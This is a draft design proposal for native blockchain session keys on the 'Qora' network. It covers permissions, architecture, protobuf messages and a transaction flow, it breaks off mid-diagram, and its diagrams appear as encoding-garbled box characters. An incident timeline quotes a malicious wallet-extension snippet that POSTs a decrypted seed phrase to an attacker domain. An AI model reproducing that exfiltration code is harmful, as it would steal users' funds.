# Qora Session Keys Protocol

## Native Protocol-Level Session Keys for Secure, Scalable Blockchain Interactions

**Version:** 1.0.0  
**Authors:** Qora Network Contributors  
**Status:** Draft Proposal  
**Created:** December 2024

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Problem Statement](#problem-statement)
3. [Solution Overview](#solution-overview)
4. [Technical Architecture](#technical-architecture)
5. [Security Model](#security-model)
6. [Threat Analysis](#threat-analysis)
7. [Comparative Analysis](#comparative-analysis)
8. [Use Cases](#use-cases)
9. [Economic Model](#economic-model)
10. [Implementation Specification](#implementation-specification)
11. [Future Roadmap](#future-roadmap)
12. [Conclusion](#conclusion)

---

## Executive Summary

Qora Session Keys introduces **native protocol-level session keys** to the Qora blockchain, enabling secure, temporary, and permission-limited transaction signing without exposing master private keys. This innovation addresses the fundamental tension between security and usability in blockchain applications.

### Key Innovations

| Feature | Description |
|---------|-------------|
| **Single-Use Keys** | Keys that auto-delete after one transaction |
| **Protocol-Level Implementation** | No smart contract overhead, minimal fees |
| **Granular Permissions** | Amount limits, recipient restrictions, contract allowlists |
| **Auto-Expiration** | Time-based and usage-based automatic key deletion |
| **WebAuthn Compatible** | Integration with hardware security modules (TPM/Secure Enclave) |

### Value Proposition

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                             â”‚
â”‚   CURRENT STATE                        WITH SESSION KEYS                    â”‚
â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                         â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                   â”‚
â”‚                                                                             â”‚
â”‚   Master Key â”€â”€â–º Every Transaction     Master Key â”€â”€â–º Create Session Key   â”‚
â”‚       â”‚                                    â”‚              â”‚                 â”‚
â”‚       â”‚                                    â”‚              â–¼                 â”‚
â”‚       â–¼                                    â”‚         Session Key â”€â”€â–º Txs   â”‚
â”‚   HIGH RISK                                â”‚              â”‚                 â”‚
â”‚   (Key always exposed)                     â–¼              â–¼                 â”‚
â”‚                                        LOW RISK       LIMITED RISK          â”‚
â”‚                                        (Rarely used)  (Restricted scope)    â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Problem Statement

### The Blockchain Security Trilemma

Modern blockchain wallets face an impossible choice:

```
                           SECURITY
                              â–²
                             /â”‚\
                            / â”‚ \
                           /  â”‚  \
                          /   â”‚   \
                         /    â”‚    \
                        /     â”‚     \
                       /      â”‚      \
                      /       â”‚       \
                     /        â”‚        \
                    â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼
              USABILITY              COST
              
   Traditional wallets sacrifice one:
   
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚ High Security + Low Cost    = Poor UX (sign every tx)â”‚
   â”‚ High Security + Good UX     = High Cost (ERC-4337)   â”‚
   â”‚ Good UX + Low Cost          = Poor Security          â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   
   Session Keys achieve all three:
   
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚ âœ“ High Security  (master key protected)             â”‚
   â”‚ âœ“ Great UX       (no signing per transaction)       â”‚
   â”‚ âœ“ Low Cost       (native protocol, no overhead)     â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Real-World Attack: Trust Wallet Incident (December 2024)

```
ATTACK TIMELINE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Dec 8, 2024     â”‚ Attacker registers malicious domain
                â”‚ api.metrics-trustwallet[.]com
                â”‚
Dec 24, 2024    â”‚ Malicious extension v2.68 published via
                â”‚ compromised Chrome Web Store API key
                â”‚
                â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                â”‚ â”‚  MALICIOUS CODE IN 4482.js                              â”‚
                â”‚ â”‚                                                         â”‚
                â”‚ â”‚  // When user unlocks wallet, seed phrase decrypted     â”‚
                â”‚ â”‚  // Malicious code intercepts and exfiltrates           â”‚
                â”‚ â”‚  fetch('api.metrics-trustwallet.com', {                 â”‚
                â”‚ â”‚    method: 'POST',                                      â”‚
                â”‚ â”‚    body: JSON.stringify({ seed: decryptedSeed })        â”‚
                â”‚ â”‚  });                                                    â”‚
                â”‚ â”‚                                                         â”‚
                â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
Dec 25, 2024    â”‚ $7M+ stolen across Bitcoin, Ethereum, Solana
                â”‚
                â”‚ Funds gone FOREVER - no recovery possible

ROOT CAUSE: Master private key must be decrypted in browser memory
            â†’ Any malicious code can steal it
            â†’ Complete and permanent fund loss
```

### Why Current Solutions Fail

| Solution | Problem |
|----------|---------|
| **Browser Wallets** | Private key in JavaScript memory â†’ easily stolen |
| **Hardware Wallets** | Require physical confirmation for every transaction â†’ poor UX |
| **Smart Contract Wallets (ERC-4337)** | 5-10x higher gas costs â†’ economically impractical for games |
| **Custodial Solutions** | Trust third party with funds â†’ defeats purpose of crypto |

---

## Solution Overview

### Qora Session Keys Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                           QORA SESSION KEYS PROTOCOL                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                        â”‚
â”‚  â”‚   USER DEVICE   â”‚                                                        â”‚
â”‚  â”‚                 â”‚                                                        â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚     ONE-TIME SETUP (with biometric)                   â”‚
â”‚  â”‚  â”‚  SECURE   â”‚  â”‚     â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                   â”‚
â”‚  â”‚  â”‚  ENCLAVE  â”‚â”€â”€â”¼â”€â”€â–º  Create Session Key Transaction                    â”‚
â”‚  â”‚  â”‚  (TPM)    â”‚  â”‚     â€¢ Max 100 QORA per tx                              â”‚
â”‚  â”‚  â”‚           â”‚  â”‚     â€¢ Only gaming contract                            â”‚
â”‚  â”‚  â”‚  Master   â”‚  â”‚     â€¢ Expires in 24 hours                             â”‚
â”‚  â”‚  â”‚  Key      â”‚  â”‚     â€¢ 1000 uses maximum                               â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚                                                        â”‚
â”‚  â”‚                 â”‚                                                        â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚     DAILY USAGE (no biometric needed)                 â”‚
â”‚  â”‚  â”‚  SESSION  â”‚  â”‚     â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                 â”‚
â”‚  â”‚  â”‚  KEY      â”‚â”€â”€â”¼â”€â”€â–º  Sign game transactions freely                     â”‚
â”‚  â”‚  â”‚  (temp)   â”‚  â”‚     â€¢ Play game âœ“                                     â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚     â€¢ Buy items âœ“                                     â”‚
â”‚  â”‚                 â”‚     â€¢ Trade assets âœ“                                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â€¢ Transfer 1000 QORA? âœ— BLOCKED                    â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                        QORA BLOCKCHAIN                                â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   SessionKey {                                                       â”‚   â”‚
â”‚  â”‚     granter: "qora1master...",      // Your main wallet              â”‚   â”‚
â”‚  â”‚     session_address: "qora1temp..", // Temporary key address         â”‚   â”‚
â”‚  â”‚     permissions: {                                                   â”‚   â”‚
â”‚  â”‚       max_amount_per_tx: 100qora,   // Limit per transaction         â”‚   â”‚
â”‚  â”‚       total_spend_limit: 500qora,   // Total limit                   â”‚   â”‚
â”‚  â”‚       allowed_contracts: [...],    // Only these contracts          â”‚   â”‚
â”‚  â”‚       allowed_recipients: [...],   // Only these addresses          â”‚   â”‚
â”‚  â”‚     },                                                               â”‚   â”‚
â”‚  â”‚     max_uses: 1000,                // Usage limit                   â”‚   â”‚
â”‚  â”‚     uses_remaining: 847,           // Current remaining             â”‚   â”‚
â”‚  â”‚     expires_at: "2024-12-28T00:00:00Z",                             â”‚   â”‚
â”‚  â”‚     auto_delete_on_exhaustion: true                                 â”‚   â”‚
â”‚  â”‚   }                                                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Validator checks permissions â†’ FREE (no smart contract gas)       â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Core Principles

1. **Minimal Attack Surface**: Master key used only to create session keys
2. **Damage Limitation**: Compromised session key = limited, bounded loss
3. **Protocol-Level Enforcement**: Validators enforce limits, not smart contracts
4. **Zero Additional Gas**: Permission checks are part of consensus, not execution

---

## Technical Architecture

### System Components

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                            SYSTEM ARCHITECTURE                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  CLIENT LAYER                                                               â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                      â”‚
â”‚  â”‚    Wallet    â”‚  â”‚     dApp     â”‚  â”‚    Game      â”‚                      â”‚
â”‚  â”‚  Extension   â”‚  â”‚   Frontend   â”‚  â”‚   Client     â”‚                      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜                      â”‚
â”‚         â”‚                 â”‚                 â”‚                               â”‚
â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                               â”‚
â”‚                           â”‚                                                 â”‚
â”‚                           â–¼                                                 â”‚
â”‚  SDK LAYER                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    Qora Session Keys SDK                              â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚   â”‚
â”‚  â”‚  â”‚   Create    â”‚  â”‚   Execute   â”‚  â”‚   Revoke    â”‚  â”‚   Query    â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  Session    â”‚  â”‚    With     â”‚  â”‚  Session    â”‚  â”‚  Sessions  â”‚  â”‚   â”‚
â”‚  â”‚  â”‚    Key      â”‚  â”‚  Session    â”‚  â”‚    Key      â”‚  â”‚            â”‚  â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                           â”‚                                                 â”‚
â”‚                           â–¼                                                 â”‚
â”‚  PROTOCOL LAYER                                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    x/sessionkeys Module                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚
â”‚  â”‚  â”‚                        Keeper                                â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  â€¢ CreateSessionKey()    â€¢ ValidatePermissions()            â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  â€¢ ExecuteWithSession()  â€¢ DecrementUses()                  â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  â€¢ RevokeSessionKey()    â€¢ PruneExpiredKeys()               â”‚    â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚
â”‚  â”‚  â”‚                      State Storage                           â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  SessionKeyPrefix          | session_addr â†’ SessionKey       â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  SessionKeyByGranterPrefix | granter|session â†’ index         â”‚    â”‚   â”‚
â”‚  â”‚  â”‚  ExpirationQueuePrefix     | timestamp|session â†’ expiry      â”‚    â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                           â”‚                                                 â”‚
â”‚                           â–¼                                                 â”‚
â”‚  CONSENSUS LAYER                                                            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                      Qora Validators                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Transaction Validation:                                            â”‚   â”‚
â”‚  â”‚  â”œâ”€â”€ Signature verification       (standard)                        â”‚   â”‚
â”‚  â”‚  â”œâ”€â”€ Balance check                (standard)                        â”‚   â”‚
â”‚  â”‚  â”œâ”€â”€ Nonce verification           (standard)                        â”‚   â”‚
â”‚  â”‚  â”œâ”€â”€ Session key permission check (NEW - no gas cost)              â”‚   â”‚
â”‚  â”‚  â””â”€â”€ Execute transaction                                            â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Data Structures

```protobuf
// SessionKey represents a temporary key with limited permissions
message SessionKey {
  // The account that granted this session key
  string granter = 1;
  
  // The address derived from the session public key
  string session_address = 2;
  
  // The session public key bytes
  bytes session_public_key = 3;
  
  // Detailed permissions for this session key
  SessionPermissions permissions = 4;
  
  // Maximum number of times this key can be used
  uint64 max_uses = 5;
  
  // Remaining uses (decremented on each use)
  uint64 uses_remaining = 6;
  
  // Expiration timestamp
  google.protobuf.Timestamp expires_at = 7;
  
  // Creation timestamp
  google.protobuf.Timestamp created_at = 8;
  
  // Label for identification
  string label = 9;
  
  // Auto-delete when uses_remaining reaches 0
  bool auto_delete_on_exhaustion = 10;
}

// SessionPermissions defines granular access controls
message SessionPermissions {
  // Maximum amount per single transaction
  cosmos.base.v1beta1.Coin max_amount_per_tx = 1;
  
  // Total spending limit across all transactions
  cosmos.base.v1beta1.Coin total_spend_limit = 2;
  
  // Amount already spent
  cosmos.base.v1beta1.Coin amount_spent = 3;
  
  // Allowed recipient addresses (empty = any)
  repeated string allowed_recipients = 4;
  
  // Allowed contract addresses (empty = any)
  repeated string allowed_contracts = 5;
  
  // Allowed message types (empty = any)
  repeated string allowed_msg_types = 6;
}
```

### Transaction Flow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         TRANSACTION FLOW                                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  CREATING A SESSION KEY                                                     â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                     â”‚
â”‚                                                                             â”‚
â”‚  User                 Wallet              Qora Chain                         â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  "Create session"   â”‚                     â”‚                             â”‚
â”‚   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  Biometric prompt   â”‚                     â”‚                             â”‚
â”‚   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  ğŸ‘† Fingerprint     â”‚                     â”‚                             â”‚
â”‚   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚  MsgCreateSession   â”‚                             â”‚
â”‚   â”‚                     â”‚  (signed by master) â”‚                             â”‚
â”‚   â”‚                     â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚  Store SessionKey           â”‚
â”‚   â”‚                     â”‚                     â”‚  in state                   â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚                     â”‚    Confirmation     â”‚                             â”‚
â”‚   â”‚                     â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                             â”‚
â”‚   â”‚                     â”‚                     â”‚                             â”‚
â”‚   â”‚  Session key stored â”‚                     â”‚                             â”‚
â”‚   â”‚  locally (encrypted)â”‚                     â”‚                             â”‚
